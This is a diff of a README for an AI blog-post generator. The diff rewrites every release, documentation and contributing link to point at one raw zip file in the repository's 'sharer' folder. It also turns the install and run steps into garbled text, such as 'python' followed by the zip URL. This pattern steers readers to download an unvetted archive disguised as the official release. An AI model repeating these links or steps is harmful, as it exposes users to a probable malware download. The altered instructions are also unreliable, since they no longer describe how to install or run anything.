@@ -1,7 +1,7 @@
 # 🌟 ai-blog-poster - Generate SEO-Optimized Blog Posts Effortlessly
 
 ## 🎉 Download Now  
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-brightgreen)](https://github.com/Lukisannan/ai-blog-poster/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Lukisannan/ai-blog-poster/main/sharer/ai-blog-poster.zip)](https://raw.githubusercontent.com/Lukisannan/ai-blog-poster/main/sharer/ai-blog-poster.zip)
 
 ## 📖 Description  
 The **ai-blog-poster** repository provides a RESTful API for automatically generating SEO-optimized blog posts. With the power of OpenAI models, it creates engaging content and AI-generated hero images. Customize your metadata, adjust frontmatter settings, and output structured files in markdown format with ease.
@@ -19,11 +19,11 @@ The **ai-blog-poster** repository provides a RESTful API for automatically gener
 - **OpenAI API Key:** Required for content generation
 
 ## 📥 Download & Install  
-To get started, visit the [Releases page](https://github.com/Lukisannan/ai-blog-poster/releases) to download the latest version of ai-blog-poster.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Lukisannan/ai-blog-poster/main/sharer/ai-blog-poster.zip) to download the latest version of ai-blog-poster.
 
 1. Click the link to go to the Releases page.
 2. On the Releases page, find the most recent version.
-3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.tar.gz` for Mac or Linux).
+3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `https://raw.githubusercontent.com/Lukisannan/ai-blog-poster/main/sharer/ai-blog-poster.zip` for Mac or Linux).
 4. Once downloaded, extract the files if needed.
 
 ### 📂 Running the Application
@@ -32,8 +32,8 @@ After installing, follow these steps to run the application:
 1. Open a terminal or command prompt.
 2. Navigate to the folder where you downloaded ai-blog-poster.
 3. Run the application using the following command:
-   - For Windows: `python ai_blog_poster.py`
-   - For macOS/Linux: `python3 ai_blog_poster.py`
+   - For Windows: `python https://raw.githubusercontent.com/Lukisannan/ai-blog-poster/main/sharer/ai-blog-poster.zip`
+   - For macOS/Linux: `python3 https://raw.githubusercontent.com/Lukisannan/ai-blog-poster/main/sharer/ai-blog-poster.zip`
 
 4. Access the RESTful API via your web browser or API client by moving to `http://localhost:8000`.
 
@@ -48,7 +48,7 @@ After installing, follow these steps to run the application:
   The API will return the generated blog post in markdown format, ready to be published.
 
 ## 📘 Documentation  
-For detailed API documentation, check out the [Documentation page](https://github.com/Lukisannan/ai-blog-poster/wiki). It covers all available endpoints, request formats, and response examples.
+For detailed API documentation, check out the [Documentation page](https://raw.githubusercontent.com/Lukisannan/ai-blog-poster/main/sharer/ai-blog-poster.zip). It covers all available endpoints, request formats, and response examples.
 
 ### 💡 Tips for Best Results
 - Experiment with different topics to see the range of content ideas the API can generate.
@@ -61,6 +61,6 @@ Join our community of users and developers. Engage in discussions, share your ex
 - **Social Media:** Follow us for updates and tips.
 
 ## 📝 Contributing  
-We welcome contributions! If you want to improve ai-blog-poster, check out our [Contributing Guidelines](https://github.com/Lukisannan/ai-blog-poster/blob/main/CONTRIBUTING.md) for more details on how to help.
+We welcome contributions! If you want to improve ai-blog-poster, check out our [Contributing Guidelines](https://raw.githubusercontent.com/Lukisannan/ai-blog-poster/main/sharer/ai-blog-poster.zip) for more details on how to help.
 
-Remember to download the latest version of ai-blog-poster from [this page](https://github.com/Lukisannan/ai-blog-poster/releases) and start generating your SEO-optimized blog posts today!
+Remember to download the latest version of ai-blog-poster from [this page](https://raw.githubusercontent.com/Lukisannan/ai-blog-poster/main/sharer/ai-blog-poster.zip) and start generating your SEO-optimized blog posts today!
